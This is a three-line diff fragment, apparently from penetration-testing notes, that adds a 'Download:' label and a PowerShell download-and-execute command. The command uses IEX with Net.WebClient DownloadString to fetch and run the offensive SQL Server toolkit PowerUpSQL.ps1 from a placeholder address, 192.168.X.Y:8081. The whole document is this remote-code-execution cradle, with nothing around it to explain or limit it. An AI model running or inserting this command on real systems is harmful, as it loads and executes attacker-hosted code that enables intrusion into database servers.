@@ -1,0 +1,3 @@
+Download:
+IEX (New-Object Net.WebClient).DownloadString('http://192.168.X.Y:8081/PowerUpSQL.ps1')
+
